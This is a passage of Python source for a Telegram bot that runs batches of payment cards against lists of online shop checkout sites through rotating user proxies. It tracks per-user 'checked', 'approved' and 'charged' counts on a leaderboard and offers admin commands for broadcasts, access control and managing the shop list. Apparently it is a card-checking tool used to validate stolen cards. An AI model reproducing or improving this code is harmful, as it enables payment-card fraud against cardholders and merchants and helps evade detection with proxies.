                        send_approved = bool(payload.get("send_approved_notifications", True))
                        processed = int(payload.get("processed", 0))
                        
                        logger.info(f"Attempting to resume batch {batch_id}: {len(cards)} total cards, {processed} processed")
                        
                        if not isinstance(cards, list) or not isinstance(sites, list) or not chat_id:
                            logger.warning(f"Invalid batch data for {batch_id}")
                            continue
                        
                        original_total = len(cards)  # Save original total before slicing
                        remaining_cards = cards[processed:] if processed > 0 else cards
                        if not remaining_cards:
                            logger.info(f"No remaining cards for batch {batch_id}, removing from pending")
                            await remove_pending(batch_id)
                            continue
                        
                        await update.message.reply_text(
                            f"🔄 <b>Resuming Paused Check</b>\n\n"
                            f"<b>{title}</b>\n"
                            f"Cards processed: {processed}/{original_total}\n"
                            f"Remaining: {len(remaining_cards)}\n\n"
                            f"Using your {added_count} newly added {'proxy' if added_count == 1 else 'proxies'}...",
                            parse_mode=ParseMode.HTML
                        )
                        
                        proxies = await get_user_proxies(user.id)
                        if not proxies:
                            logger.warning(f"No proxies found for user {user.id} when trying to resume")
                            await update.message.reply_text("⚠️ No proxies found. Cannot resume.")
                            continue
                        
                        logger.info(f"Resuming batch {batch_id} with {len(proxies)} proxies")
                        
                        cancel_event = asyncio.Event()
                        
                        # Pass total_override to preserve the original total count when resuming
                        runner = BatchRunner(
                            remaining_cards,
                            sites,
                            GLOBAL_EXECUTOR,
                            batch_id,
                            chat_id,
                            user.id,
                            cancel_event,
                            send_approved_notifications=send_approved,
                            proxies_override=proxies,
                            start_from=processed,
                            total_override=original_total
                        )
                        
                        context.application.create_task(
                            runner.run_with_notifications(update, context, title=title)
                        )
                        
                        logger.info(f"Successfully resumed batch {batch_id}")
                        
                    except Exception as e:
                        logger.error(f"Failed to resume batch {batch_id}: {e}")
                        try:
                            await update.message.reply_text(f"⚠️ Failed to resume check: {str(e)[:100]}")
                        except Exception:
                            pass
                        continue
            else:
                logger.info(f"No pending batches found (empty or None)")
        except Exception as e:
            logger.error(f"Error checking for paused batches: {e}")
            try:
                await update.message.reply_text(f"⚠️ Error checking for paused checks: {str(e)[:100]}")
            except Exception:
                pass
            
    elif duplicate_count > 0:
        try:
            await update.message.reply_text("Proxy Already Added")
        except Exception:
            pass
    else:
        try:
            await update.message.reply_text("Proxy Dead")
        except Exception:
            pass

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show aggregate user stats sorted by tested cards"""
    user = update.effective_user
    if not await has_permission(user.id, "stats"):
        await update.message.reply_text("Unauthorized.")
        return
    
    stats = await get_all_stats()
    if not stats:
        await update.message.reply_text("No stats available yet.")
        return
    
    user_list = []
    total_tested = 0
    total_approved = 0
    total_charged = 0
    
    for uid_str, rec in stats.items():
        tested = int(rec.get("tested", 0) or 0)
        approved = int(rec.get("approved", 0) or 0)
        charged = int(rec.get("charged", 0) or 0)
        declined = max(0, tested - approved - charged)
        name = rec.get("name", "Unknown")
        username = rec.get("username", "")
        
        user_list.append({
            "uid": uid_str,
            "name": name,
            "username": username,
            "tested": tested,
            "approved": approved,
            "charged": charged,
            "declined": declined
        })
        
        total_tested += tested
        total_approved += approved
        total_charged += charged
    
    user_list.sort(key=lambda x: x["tested"], reverse=True)
    
    total_declined = max(0, total_tested - total_approved - total_charged)
    
    # Calculate success rates
    approval_rate = (total_approved / total_tested * 100) if total_tested > 0 else 0
    charge_rate = (total_charged / total_tested * 100) if total_tested > 0 else 0
    
    header = (
        "📊 <b>User Statistics Leaderboard</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🏆 <b>Top 20 Users (Sorted by Checked)</b>\n\n"
    )
    
    # Redesign body with better formatting
    body_lines = []
    rank = 1
    for u in user_list[:20]:
        name = u["name"]
        username = u["username"]
        uid_str = u["uid"]
        tested = u["tested"]
        approved = u["approved"]
        charged = u["charged"]
        declined = u["declined"]
        
        # Use name as display (no @username in brackets)
        display = name
        
        # Create clickable user link (just the name, no @username in brackets)
        try:
            uid_int = int(uid_str)
            user_link = f'<a href="tg://user?id={uid_int}">{display}</a>'
        except:
            user_link = display
        
        # Format with emojis and better layout
        medal = "🥇" if rank == 1 else "🥈" if rank == 2 else "🥉" if rank == 3 else f"{rank}."
        body_lines.append(
            f"{medal} <b>{user_link}</b> [<code>{uid_str}</code>]\n"
            f"   💳 Checked: <code>{tested:,}</code> | "
            f"✅ Approved: <code>{approved:,}</code> | "
            f"💎 Charged: <code>{charged:,}</code>\n"
            f"   ❌ Declined: <code>{declined:,}</code>\n\n"
        )
        rank += 1
    
    if not body_lines:
        body_lines.append("📭 <i>No data available yet.</i>\n\n")
    
    body = "".join(body_lines)
    
    footer = (
        "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📈 <b>Total Statistics:</b>\n\n"
        f"💳 <b>Checked:</b> <code>{total_tested:,}</code>\n"
        f"✅ <b>Approved:</b> <code>{total_approved:,}</code> ({approval_rate:.1f}%)\n"
        f"💎 <b>Charged:</b> <code>{total_charged:,}</code> ({charge_rate:.1f}%)\n"
        f"❌ <b>Declined:</b> <code>{total_declined:,}</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await update.message.reply_text(f"{header}{body}{footer}", parse_mode=ParseMode.HTML, disable_web_page_preview=True)

async def cmd_resetstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "resetstats"):
        await update.message.reply_text("Unauthorized.")
        return
    with STATS_LOCK:
        _save_stats({})
    await update.message.reply_text("Stats reset.")

async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "broadcast"):
        await update.message.reply_text("Unauthorized.")
        return

    full_text = (update.message.text or "").strip()
    body = ""

    try:
        if full_text.lower().startswith("/broadcast"):
            body = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        body = ""

    if not body:
        parts = full_text.split("\n", 1)
        if len(parts) >= 2 and parts[1].strip():
            body = parts[1].strip()

    if not body:
        replied = update.message.reply_to_message
        if replied:
            rt = getattr(replied, "text", None)
            if isinstance(rt, str) and rt.strip():
                body = rt.strip()

    if not body:
        await update.message.reply_text("Usage:\n/broadcast <message>\nOr reply to a message with /broadcast")
        return

    stats = await get_all_stats()
    try:
        uids = [int(uid) for uid in stats.keys() if str(uid).isdigit()]
    except Exception:
        uids = []

    if not uids:
        await update.message.reply_text("No recipients found.")
        return

    sem = asyncio.Semaphore(BROADCAST_WORKERS)
    sent = 0
    failed = 0

    async def send_to(uid: int):
        nonlocal sent, failed
        async with sem:
            try:
                await context.bot.send_message(
                    chat_id=uid,
                    text=body,
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True,
                )
                sent += 1
            except Exception:
                failed += 1

    tasks = [asyncio.create_task(send_to(uid)) for uid in uids]
    await asyncio.gather(*tasks, return_exceptions=True)
    await update.message.reply_text(f"Broadcast sent to {sent} users; failed: {failed}")

async def cmd_broadcastuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "broadcastuser"):
        await update.message.reply_text("Unauthorized.")
        return

    full_text = (update.message.text or "").strip()
    args = ""
    try:
        if full_text.lower().startswith("/broadcastuser"):
            args = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        args = ""

    target = ""
    body = ""

    if args:
        parts = args.split(" ", 1)
        target = (parts[0] or "").strip()
        body = (parts[1] or "").strip() if len(parts) > 1 else ""

    if not body:
        replied = update.message.reply_to_message
        if replied:
            rt = getattr(replied, "text", None)
            if isinstance(rt, str) and rt.strip():
                body = rt.strip()

    if not target or not body:
        await update.message.reply_text("Usage:\n/broadcastuser @username <message>\nOr /broadcastuser <numeric_user_id> <message>")
        return

    uid = None
    try:
        if target.isdigit():
            uid = int(target)
    except Exception:
        uid = None

    if uid is None:
        try:
            t = target.strip()
            if t.startswith("@"):
                t_at = t
                t_plain = t[1:]
            else:
                t_at = f"@{t}"
                t_plain = t
            stats = await get_all_stats()
            for k, rec in (stats or {}).items():
                uname = (rec.get("username") or "").strip()
                if not uname:
                    continue
                comp = uname.strip()
                comp_at = comp if comp.startswith("@") else f"@{comp}"
                if comp_at.lower() == t_at.lower() or comp.lower() == t_plain.lower():
                    try:
                        uid = int(k)
                        break
                    except Exception:
                        continue
            if uid is None:
                for k, rec in (stats or {}).items():
                    name = (rec.get("name") or "").strip()
                    if not name:
                        continue
                    comp = name.strip()
                    if comp.lower() == t_at.lower() or comp.lower() == t_plain.lower():
                        try:
                            uid = int(k)
                            break
                        except Exception:
                            continue
        except Exception:
            uid = None

    if uid is None:
        await update.message.reply_text("Target user not found in stats. Ask them to interact with the bot first.")
        return

    try:
        chat_obj = await context.bot.get_chat(uid)
        try:
            full = getattr(chat_obj, "full_name", None)
        except Exception:
            full = None
        if not full:
            try:
                first = getattr(chat_obj, "first_name", "") or ""
                last = getattr(chat_obj, "last_name", "") or ""
                full = f"{first} {last}".strip()
            except Exception:
                full = None
        try:
            un = getattr(chat_obj, "username", None)
        except Exception:
            un = None
        try:
            with STATS_LOCK:
                s2 = _load_stats()
                key = str(uid)
                cur = s2.get(key, {})
                if isinstance(full, str) and full.strip():
                    cur["name"] = full.strip()
                if isinstance(un, str) and un.strip():
                    cur["username"] = un.strip()
                s2[key] = cur
                _save_stats(s2)
        except Exception:
            pass
    except Exception:
        pass

    async def _mention_for(uid_inner: int) -> str:
        try:
            su = await get_user_stats(uid_inner)
            uname = (su.get("username") or "").strip() if isinstance(su.get("username"), str) else ""
            disp = (su.get("name") or str(uid_inner)).strip()
            if uname:
                return f"@{uname}" if not uname.startswith("@") else uname
            return f'<a href="tg://user?id={uid_inner}">{disp}</a>'
        except Exception:
            return f'<a href="tg://user?id={uid_inner}">{uid_inner}</a>'

    preferred_chat_id: Optional[int] = None
    try:
        async with ACTIVE_LOCK:
            for _, rec in ACTIVE_BATCHES.items():
                if rec.get("user_id") == uid:
                    preferred_chat_id = rec.get("chat_id")
                    break
    except Exception:
        preferred_chat_id = None

    try:
        su = await get_user_stats(uid)
    except Exception:
        su = {}
    last_chat_id = su.get("last_chat_id")
    try:
        me = await context.bot.get_me()
        bot_un = getattr(me, "username", None) or ""
        bot_link = f"https://t.me/{bot_un}?start=broadcast" if bot_un else ""
    except Exception:
        bot_link = ""

    if preferred_chat_id:
        try:
            is_group = int(preferred_chat_id) < 0
            text_send = body
            if is_group:
                m = await _mention_for(uid)
                text_send = f"{m}\n\n{body}"
            await context.bot.send_message(
                chat_id=int(preferred_chat_id),
                text=text_send,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
            await update.message.reply_text(f"Broadcast delivered in active chat {preferred_chat_id}.")
            return
        except Exception:
            pass

    try:
        await context.bot.send_message(
            chat_id=uid,
            text=body,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        await update.message.reply_text(f"Broadcast delivered via DM to {uid}.")
        return
    except Exception as dm_err:
        dm_error = dm_err

    if last_chat_id:
        try:
            is_group = int(last_chat_id) < 0
            text_send = body
            if is_group:
                m = await _mention_for(uid)
                text_send = f"{m}\n\n{body}"
            await context.bot.send_message(
                chat_id=int(last_chat_id),
                text=text_send,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
            await update.message.reply_text(f"Broadcast delivered in last chat {last_chat_id}.")
            return
        except Exception as e2:
            await update.message.reply_text(f"DM failed: {dm_error}\nAlso failed in last chat {last_chat_id}: {e2}")

    guidance = (
        f"DM failed: {dm_error}\n"
        f"No known chat with this user to notify. Share this link and ask them to Start the bot:\n{bot_link}"
        if bot_link
        else f"DM failed: {dm_error}\nNo known chat with this user to notify."
    )
    await update.message.reply_text(guidance)

async def cmd_broadcastactive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "broadcastactive"):
        await update.message.reply_text("Unauthorized.")
        return

    full_text = (update.message.text or "").strip()
    body = ""

    try:
        if full_text.lower().startswith("/broadcastactive"):
            body = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        body = ""

    if not body:
        parts = full_text.split("\n", 1)
        if len(parts) >= 2 and parts[1].strip():
            body = parts[1].strip()

    if not body:
        replied = update.message.reply_to_message
        if replied:
            rt = getattr(replied, "text", None)
            if isinstance(rt, str) and rt.strip():
                body = rt.strip()

    if not body:
        await update.message.reply_text("Usage:\n/broadcastactive <message>\nOr reply to a message with /broadcastactive")
        return

    async with ACTIVE_LOCK:
        active_items = list(ACTIVE_BATCHES.values())

    user_targets: Dict[int, Optional[int]] = {}
    for rec in active_items:
        try:
            uid = rec.get("user_id")
            chat_id = rec.get("chat_id")
            if uid:
                if uid not in user_targets:
                    user_targets[int(uid)] = int(chat_id) if chat_id else None
        except Exception:
            continue

    if not user_targets:
        await update.message.reply_text("No active users found.")
        return

    sem = asyncio.Semaphore(BROADCAST_WORKERS)
    sent = 0
    failed = 0

    async def mention_for(uid: int) -> str:
        try:
            s = await get_user_stats(uid)
            uname = (s.get("username") or "").strip() if isinstance(s.get("username"), str) else ""
            disp_name = (s.get("name") or str(uid)).strip()
            if uname:
                return f"@{uname}" if not uname.startswith("@") else uname
            return f'<a href="tg://user?id={uid}">{disp_name}</a>'
        except Exception:
            return f'<a href="tg://user?id={uid}">{uid}</a>'

    async def send_to(uid: int, preferred_chat_id: Optional[int]):
        nonlocal sent, failed
        async with sem:
            if preferred_chat_id:
                try:
                    is_group = int(preferred_chat_id) < 0
                    text = body
                    if is_group:
                        m = await mention_for(uid)
                        text = f"{m}\n\n{body}"
                    await context.bot.send_message(
                        chat_id=preferred_chat_id,
                        text=text,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                    )
                    sent += 1
                    return
                except Exception:
                    pass
            try:
                await context.bot.send_message(
                    chat_id=uid,
                    text=body,
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True,
                )
                sent += 1
                return
            except Exception:
                try:
                    s = await get_user_stats(uid)
                    last_chat_id = s.get("last_chat_id")
                except Exception:
                    last_chat_id = None
                if last_chat_id:
                    try:
                        is_group = int(last_chat_id) < 0
                        text = body
                        if is_group:
                            m = await mention_for(uid)
                            text = f"{m}\n\n{body}"
                        await context.bot.send_message(
                            chat_id=int(last_chat_id),
                            text=text,
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True,
                        )
                        sent += 1
                        return
                    except Exception:
                        pass
                failed += 1

    tasks = [asyncio.create_task(send_to(uid, chat_id)) for uid, chat_id in user_targets.items()]
    await asyncio.gather(*tasks, return_exceptions=True)
    await update.message.reply_text(f"Broadcast sent to {sent} active users; failed: {failed}")

async def cmd_restrict(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "restrict"):
        await update.message.reply_text("Unauthorized.")
        return
    text = (update.message.text or "").strip()
    args = ""
    try:
        parts = text.split(" ", 1)
        args = parts[1] if len(parts) > 1 else ""
    except Exception:
        args = ""
    policy = await get_access_policy()
    if not args or args.lower().strip() == "all":
        policy["restrict_all"] = True
        await set_access_policy(policy)
        await update.message.reply_text("Restriction enabled: all non-admins are blocked.")
        return
    toks = []
    for sep in [",", "\n"]:
        args = args.replace(sep, " ")
    for tok in args.split(" "):
        tok = tok.strip()
        if not tok:
            continue
        try:
            val = int(tok)
            toks.append(val)
        except Exception:
            pass
    if not toks:
        await update.message.reply_text("Usage: /restrict all OR /restrict <user_id>[, ...]")
        return
    blocked = set(policy.get("blocked_ids") or [])
    for u in toks:
        blocked.add(u)
    policy["blocked_ids"] = sorted(blocked)
    await set_access_policy(policy)
    await update.message.reply_text(f"Blocked users updated: {policy['blocked_ids']}")

async def cmd_allowonly(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "allowonly"):
        await update.message.reply_text("Unauthorized.")
        return
    text = (update.message.text or "").strip()
    args = ""
    try:
        parts = text.split(" ", 1)
        args = parts[1] if len(parts) > 1 else ""
    except Exception:
        args = ""
    if not args:
        await update.message.reply_text("Usage: /allowonly <id>[, ...]")
        return
    ids = []
    for sep in [",", "\n"]:
        args = args.replace(sep, " ")
    for tok in args.split(" "):
        tok = tok.strip()
        if not tok:
            continue
        try:
            ids.append(int(tok))
        except Exception:
            pass
    if not ids:
        await update.message.reply_text("Usage: /allowonly <id>[, ...]")
        return
    policy = await get_access_policy()
    policy["allow_only_ids"] = sorted(set(ids))
    policy["restrict_all"] = True
    await set_access_policy(policy)
    await update.message.reply_text(f"Allow-only set: {policy['allow_only_ids']} (admins always allowed)")

async def cmd_unrestrict(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "unrestrict"):
        await update.message.reply_text("Unauthorized.")
        return

    text = (update.message.text or "").strip()
    args = ""
    try:
        parts = text.split(" ", 1)
        args = parts[1] if len(parts) > 1 else ""
    except Exception:
        args = ""

    policy = await get_access_policy()

    if not args or args.lower().strip() == "all":
        policy["restrict_all"] = False
        policy["allow_only_ids"] = []
        await set_access_policy(policy)
        await update.message.reply_text("Restriction disabled: non-admins are allowed. allow_only_ids cleared.")
        return

    toks = []
    for sep in [",", "\n"]:
        args = args.replace(sep, " ")
    for tok in args.split(" "):
        tok = tok.strip()
        if not tok:
            continue
        try:
            toks.append(int(tok))
        except Exception:
            pass

    if not toks:
        await update.message.reply_text("Usage: /unrestrict all OR /unrestrict <user_id>[, ...]")
        return

    blocked = set(policy.get("blocked_ids") or [])
    before = set(blocked)
    for u in toks:
        blocked.discard(u)
    policy["blocked_ids"] = sorted(blocked)
    await set_access_policy(policy)
    removed = sorted(before - set(blocked))
    if removed:
        await update.message.reply_text(f"Unblocked users: {removed}\nCurrent blocked list: {policy['blocked_ids']}")
    else:
        await update.message.reply_text(f"No changes. Current blocked list: {policy['blocked_ids']}")

async def cmd_addsite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "addsite"):
        await update.message.reply_text("Unauthorized.")
        return

    full_text = (update.message.text or "").strip()
    body = ""
    try:
        if full_text.lower().startswith("/addsite"):
            body = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        body = ""
    if not body:
        parts = full_text.split("\n", 1)
        if len(parts) >= 2 and parts[1].strip():
            body = parts[1].strip()
    if not body:
        replied = update.message.reply_to_message
        if replied:
            # Check if replying to a text message
            rt = getattr(replied, "text", None)
            if isinstance(rt, str) and rt.strip():
                body = rt.strip()
            # Check if replying to a document/file
            elif replied.document:
                doc = replied.document
                file_name = doc.file_name or ""
                if file_name.lower().endswith(".txt"):
                    try:
                        # Download the file
                        import tempfile
                        file = await context.bot.get_file(doc.file_id)
                        with tempfile.NamedTemporaryFile(mode='w+b', suffix='.txt', delete=False) as tmp:
                            tmp_path = tmp.name
                        await file.download_to_drive(custom_path=tmp_path)
                        
                        # Read file contents
                        with open(tmp_path, 'r', encoding='utf-8', errors='ignore') as f:
                            body = f.read()
                        
                        # Clean up temporary file
                        try:
                            os.unlink(tmp_path)
                        except Exception:
                            pass
                    except Exception as e:
                        await update.message.reply_text(f"Failed to download/read file: {e}")
                        return
    if not body:
        await update.message.reply_text(
            "Usage:\n"
            "/addsite <site_url>\n"
            "Or multi-line:\n"
            "/addsite\n"
            "site1\n"
            "site2\n"
            "...\n"
            "Or reply to a .txt file containing URLs (one per line)"
        )
        return

    raw_lines = [ln.strip() for ln in body.splitlines() if (ln or "").strip()]
    candidates = []
    for ln in raw_lines:
        try:
            url = checkout.normalize_shop_url(ln)
            if isinstance(url, str) and url.lower().startswith("http"):
                url = url.rstrip("/")
                candidates.append(url)
        except Exception:
            continue

    if not candidates:
        await update.message.reply_text("No valid sites found.")
        return

    unique_input = []
    seen = set()
    for u in candidates:
        if u not in seen:
            seen.add(u)
            unique_input.append(u)

    try:
        existing_list = checkout.read_sites_from_file("working_sites.txt") or []
    except Exception:
        existing_list = []
    existing_set = set()
    for s in existing_list:
        try:
            n = checkout.normalize_shop_url(s).rstrip("/")
        except Exception:
            n = str(s or "").strip().rstrip("/")
        if n:
            existing_set.add(n)

    to_add = [u for u in unique_input if u not in existing_set]
    if not to_add:
        await update.message.reply_text("Sites Already Added")
        return

    try:
        with open("working_sites.txt", "a", encoding="utf-8") as f:
            for u in to_add:
                f.write(u + "\n")
    except Exception as e:
        await update.message.reply_text(f"Failed to add sites: {e}")
        return

    try:
        msg = f"Added {len(to_add)} Site" if len(to_add) == 1 else f"Added {len(to_add)} Sites"
        await update.message.reply_text(msg)
    except Exception:
        pass

async def cmd_rmsite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "rmsite"):
        await update.message.reply_text("Unauthorized.")
        return

    full_text = (update.message.text or "").strip()
    args = ""
    try:
        if full_text.lower().startswith("/rmsite"):
            args = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        args = ""

    if not args:
        replied = update.message.reply_to_message
        if replied:
            rt = getattr(replied, "text", None)
            if isinstance(rt, str) and rt.strip():
                args = rt.strip()

    # Handle "/rmsite all" command (admin only)
    if args and args.strip().lower() == "all":
        if not is_admin(user.id):
            await update.message.reply_text("❌ Unauthorized. Admin only.")
            return
        
        try:
            # Read all sites from working_sites.txt
            sites = checkout.read_sites_from_file("working_sites.txt") or []
            if not sites:
                await update.message.reply_text("ℹ️ No sites found in working_sites.txt.")
                return
            
            total_count = len(sites)
            
            # Clear the entire file
            with open("working_sites.txt", "w", encoding="utf-8") as f:
                f.write("")  # Write empty file
            
            # Clear all cache entries
            try:
                with BOT_PRODUCT_CACHE_LOCK:
                    BOT_PRODUCT_CACHE.clear()
                    logger.info("Cleared all site cache entries")
            except Exception as e:
                logger.error(f"Error clearing cache: {e}")
            
            # Log removal
            for site in sites:
                try:
                    log_site_removal(site, "Bulk removal (all) by admin", user.id)
                except Exception:
                    pass
            
            await update.message.reply_text(
                f"🗑️ <b>All Sites Removed</b>\n\n"
                f"✅ Removed: {total_count} site(s)\n"
                f"📁 File cleared: working_sites.txt\n"
                f"🗄️ Cache cleared\n\n"
                f"<b>Note:</b> All sites have been removed from working_sites.txt and cache.",
                parse_mode=ParseMode.HTML
            )
            return
        except Exception as e:
            logger.error(f"Error removing all sites: {e}")
            await update.message.reply_text(f"❌ Error removing all sites: {e}")
            return

    if not args:
        await update.message.reply_text("Usage: /rmsite <site1> [site2 ...]\nOr reply to a message with site URLs and use /rmsite.\n\nAdmin: /rmsite all - Remove all sites")
        return

    raw = args.replace(",", " ").replace("\n", " ").replace("\r", " ")
    tokens = [t.strip() for t in raw.split(" ") if t.strip()]
    sites = []
    for tok in tokens:
        try:
            url = checkout.normalize_shop_url(tok)
            if url and url.lower().startswith("http"):
                sites.append(url.rstrip("/"))
        except Exception:
            continue
    if not sites:
        await update.message.reply_text("No valid site URLs found.")
        return
    unique_sites = sorted(set(sites))
    removed = []
    failed = []

    for s in unique_sites:
        ok = False
        try:
            ok = checkout.remove_site_from_working_sites(s)
            logger.info(f"Attempted to remove site: {s} - Success: {ok}")
        except Exception as e:
            logger.error(f"Error removing site {s}: {e}")
            ok = False
        if ok:
            removed.append(s)
            log_site_removal(s, "Manual removal by user", user.id)
            try:
                with BOT_PRODUCT_CACHE_LOCK:
                    BOT_PRODUCT_CACHE.pop(s, None)
                    site_domain = s.replace("https://", "").replace("http://", "").split("/")[0]
                    keys_to_remove = [k for k in BOT_PRODUCT_CACHE.keys() if site_domain in k]
                    for key in keys_to_remove:
                        BOT_PRODUCT_CACHE.pop(key, None)
                        logger.info(f"Cleared cache for: {key}")
            except Exception as e:
                logger.error(f"Error clearing cache for {s}: {e}")
                pass
        else:
            failed.append(s)

    lines = []
    lines.append(f"🗑️ <b>Site Removal Report</b>\n")
    lines.append(f"Requested: {len(unique_sites)} site(s)")
    lines.append(f"✅ Removed: {len(removed)}")
    if removed:
        show = removed[:10]
        lines.append("\n<b>Removed sites:</b>")
        for u in show:
            domain = u.replace("https://", "").replace("http://", "").split("/")[0]
            lines.append(f"  • {domain}")
        if len(removed) > len(show):
            lines.append(f"  ... and {len(removed) - len(show)} more")
    if failed:
        lines.append(f"\n❌ Failed: {len(failed)}")
        for u in failed[:5]:
            domain = u.replace("https://", "").replace("http://", "").split("/")[0]
            lines.append(f"  • {domain}")
    
    if removed:
        lines.append(f"\n<b>Note:</b> Sites removed from file and cache.")
        lines.append(f"Running checks will continue with old sites.")
        lines.append(f"New checks will use the updated site list.")

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML, disable_web_page_preview=True)

async def cmd_flsite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command: Filter URLs from a txt file and return them in working_sites.txt format"""
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("❌ Unauthorized. Admin only.")
        return
    
    # Check if replying to a document
    replied = update.message.reply_to_message
    if not replied or not replied.document:
        await update.message.reply_text(
            "Usage: Reply to a .txt file containing URLs with /flsite\n\n"
            "The command will filter and normalize URLs from the file and return them in a format ready for working_sites.txt"
        )
        return
    
    doc = replied.document
    file_name = doc.file_name or ""
    if not file_name.lower().endswith(".txt"):
        await update.message.reply_text("❌ Please reply to a .txt file.")
        return
    
    try:
        # Download the file
        import tempfile
        file = await context.bot.get_file(doc.file_id)
        with tempfile.NamedTemporaryFile(mode='w+b', suffix='.txt', delete=False) as tmp:
            tmp_path = tmp.name
        await file.download_to_drive(custom_path=tmp_path)
        
        # Read file contents
        with open(tmp_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Clean up temporary file
        try:
            os.unlink(tmp_path)
        except Exception:
            pass
        
        # Extract and filter URLs from any format using comprehensive and accurate regex
        import re
        from urllib.parse import urlparse
        filtered_urls = []
        seen = set()
        
        # Process line by line to avoid extracting URLs from response/proxy info sections
        lines = content.splitlines()
        in_detailed_section = False
        
        for line in lines:
            line = line.strip()
            
            # Skip empty lines, comments, and headers
            if not line or line.startswith('#') or line.startswith('='):
                # Check if we're entering the detailed response section
                if 'DETAILED RESPONSE INFO' in line.upper():
                    in_detailed_section = True
                continue
            
            # Skip lines in detailed response section (they repeat the same URLs)
            if in_detailed_section:
                # Skip lines that are response/proxy info (indented or contain "Response:" or "Proxy:")
                if line.startswith('  ') or 'Response:' in line or 'Proxy:' in line:
                    continue
                # If we hit a URL on its own line in detailed section, skip it (already extracted from working sites section)
                if line.startswith('https://'):
                    continue
            
            # Skip status messages
            if any(skip in line.lower() for skip in ['page', 'found', 'total', 'unique urls', 'startpage', 'mojeek']):
                continue
            
            # Only extract URLs that start at the beginning of the line (not indented)
            # This ensures we get URLs from the "WORKING SITES" section, not from response info
            if line.startswith('https://') or line.startswith('http://'):
                url_raw = line
                
                # Clean up the URL - remove trailing backslashes, punctuation, and whitespace
                url_clean = url_raw.strip()
                # Remove trailing backslash if present
                if url_clean.endswith('\\'):
                    url_clean = url_clean[:-1].strip()
                # Remove trailing punctuation
                url_clean = url_clean.rstrip('.,;:!?)').strip()
                
                # Skip if too short
                if len(url_clean) < 10:
                    continue
                
                # Handle format: URL|PROXY (take only the URL part)
                if '|' in url_clean:
                    url_part = url_clean.split('|')[0].strip()
                else:
                    url_part = url_clean
                
                # Validate it's a real URL using urlparse
                try:
                    parsed = urlparse(url_part)
                    if not parsed.netloc or not parsed.scheme:
                        continue
                    # Must have a valid domain
                    if '.' not in parsed.netloc or len(parsed.netloc.split('.')) < 2:
                        continue
                except Exception:
                    continue
                
                # Skip if it's clearly not a URL (status messages, etc.)
                url_lower = url_part.lower()
                if any(skip in url_lower for skip in ['http://page', 'https://page', 'http://found', 'https://found', 
                                                       'http://total', 'https://total', 'http://unique', 'https://unique']):
                    continue
                
                # Normalize the URL
                try:
                    normalized = normalize_url(url_part)
                    if normalized:
                        # Remove trailing slash for consistency
                        normalized = normalized.rstrip("/")
                        if normalized and normalized not in seen:
                            seen.add(normalized)
                            filtered_urls.append(normalized)
                except Exception:
                    continue
            else:
                # For lines that don't start with http://, try to extract URLs using regex
                # But only if the line doesn't contain response/proxy info
                if 'Response:' not in line and 'Proxy:' not in line and not line.startswith('  '):
                    url_pattern = r'https?://(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}(?:[/?#][^\s<>"\'\)\\|\[\]]*)?'
                    matches = re.finditer(url_pattern, line, re.IGNORECASE)
                    
                    for match in matches:
                        url_raw = match.group(0)
                        url_clean = url_raw.strip().rstrip('\\').rstrip('.,;:!?)').strip()
                        
                        if len(url_clean) < 10:
                            continue
                        
                        if '|' in url_clean:
                            url_part = url_clean.split('|')[0].strip()
                        else:
                            url_part = url_clean
                        
                        try:
                            parsed = urlparse(url_part)
                            if not parsed.netloc or not parsed.scheme:
                                continue
                            if '.' not in parsed.netloc or len(parsed.netloc.split('.')) < 2:
                                continue
                        except Exception:
                            continue
                        
                        try:
                            normalized = normalize_url(url_part)
                            if normalized:
                                normalized = normalized.rstrip("/")
                                if normalized and normalized not in seen:
                                    seen.add(normalized)
                                    filtered_urls.append(normalized)
                        except Exception:
                            continue
        
        if not filtered_urls:
            await update.message.reply_text("❌ No valid URLs found in the file.")
            return
        
        # Format output for working_sites.txt (one URL per line)
        output = "\n".join(filtered_urls)
        
        # Always send as a txt file
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as tmp:
            tmp.write(output)
            tmp_path = tmp.name
        
        try:
            with open(tmp_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename="filtered_sites.txt",
                    caption=f"✅ Filtered {len(filtered_urls)} URL(s) ready for working_sites.txt"
                )
        finally:
            try:
                os.unlink(tmp_path)
            except Exception:
                pass
    
